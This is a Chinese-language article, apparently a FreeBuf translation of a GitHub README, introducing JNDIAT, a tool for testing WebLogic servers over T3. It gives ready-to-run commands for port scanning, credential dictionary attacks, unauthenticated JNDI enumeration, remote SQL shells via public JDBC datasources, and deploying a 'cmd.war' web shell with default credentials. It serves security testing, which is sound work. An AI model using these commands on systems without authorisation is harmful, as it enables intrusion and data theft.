**JNDIAT（JNDI攻击工具）是一款开源的通过T3协议测试Weblogic server安全性的工具。**

JNDIAT使用示例：

> 搜索是否有可通过T3协议访问的Weblogic端口；
>
> 远程搜索有效帐户以获取特权连接；
>
> 列出可访问的JNDI（Java命名和目录接口），以了解你在远程Weblogic server上可以做执行的操作（无需/使用WebLogic帐户）；
>
> 使用不受保护的（即“public”）JDBC数据源，来获取远程交互式SQL shell；
>
> 在Weblogic server上部署应用（例如War）以获取Web shell（需要帐户）。

*已在Oracle Weblogic 11上进行测试。

## 特性

同时支持T3和T3（T3 over SSL）连接。JNDIAT会创建一个本地临时Java KeyStore来验证Weblogic server的证书；

支持使用空凭证进行身份验证，即login='' and password=''。
默认情况下，在Weblogic中公共JDBC数据源可以与空帐户一起使用（已在version11上测试）;

如果weblogic在域中，则支持targets；

检测可通过T3协议访问的端口；

通过字典攻击查找有效凭据；

获取可通过特定帐户（或无帐户）访问的JNDI列表；

通过JDBC数据源获取远程sql shell；

使用特权帐户，你可以在weblogic服务器上部署应用程序获取Web shell。

## 使用示例

下载安装最新版本的jndiat：<https://github.com/quentinhardy/jndiat/releases>

###  **查看帮助**

    
    
    java -jar Jndiat.jar -h

###  **JNDIAT 版本**

    
    
    java -jar Jndiat.jar --version

###  **端口扫描**

该模块用于扫描可通过T3（或T3）协议访问的端口，获取JNDI列表。

使用7001端口建立一个T3连接：

    
    
    java -jar Jndiat.jar scan -s 192.168.56.101 --ports 7001

扫描7001和7002端口：

    
    
    java -jar Jndiat.jar scan -s 192.168.56.101 --ports '7001,7002'

扫描7001到7010之间的端口：

    
    
    java -jar Jndiat.jar scan -s 192.168.56.101 --ports '7001-7010'

## JNDIs列表

该模块用于获取通过T3协议可访问的JNDI列表。此模块非常有用，可以让你知道某些JNDI是否可以在不进行身份验证的情况下访问（例如：“public”JDBC数据源）。

获取192.168.56.101服务器7001端口可访问的JNDIs：

    
    
    java -jar Jndiat.jar list -s 192.168.56.101 -p 7001

如果未在命令中指定凭据，则JNDIAT将为我们返回无需身份验证即可访问的JNDI。如果你知道有效凭据，则可以使用它来获取更多的JNDI：

    
    
    java -jar Jndiat.jar list -s 192.168.56.101 -p 7001 -U username -P password

## JDBC数据源

此模块允许你通过JDBC数据源获取远程SQL shell。

从JNDI数据源获取交互式SQL shell：

    
    
    java -jar Jndiat.jar datasource -s 192.168.56.101 -p 7001 --sql-shell

JNDIAT将会询问你所使用的JDBC数据源。如果你知道数据源名称，则可以进行指定：

    
    
    java -jar Jndiat.jar datasource -s 192.168.56.101 -p 7001 --sql-shell --datasource='jdbc/myDataSource'

## 部署应用

该模块允许你通过T3协议在远程Weblogic
server中部署应用程序（例如.war，.ear）。要使用此模块，你可能需要有高权限（一个帐户那是必须的）。

以下命令将在远程Weblogic server上部署“cmd.war”应用：

    
    
    java -jar Jndiat.jar deployer -s 192.168.56.101 -p 7002 -U weblogic -P welcome1 --deploy --appl-file cmd.war

从远程weblogic server取消部署先前的war（'cmd.war'）应用：

    
    
    java -jar Jndiat.jar deployer -s 192.168.56.101 -p 7002 -U weblogic -P welcome1 --undeploy

使用--display-name选项更改weblogic server上部署的应用程序名称：

    
    
    java -jar Jndiat.jar deployer -s 192.168.56.101 -p 7002 -U weblogic -P welcome1 --deploy --appl-file 'cmd.war' --display-name 'appli-name-displayed'

取消部署名为appli-name-display的特定应用程序：

    
    
    java -jar Jndiat.jar deployer -s 192.168.56.101 -p 7002 -U weblogic -P welcome1 --undeploy --display-name 'appli-name-displayed'

***参考来源：[GitHub](https://github.com/quentinhardy/jndiat)，FB小编secist编译，转载请注明来自FreeBuf.COM**

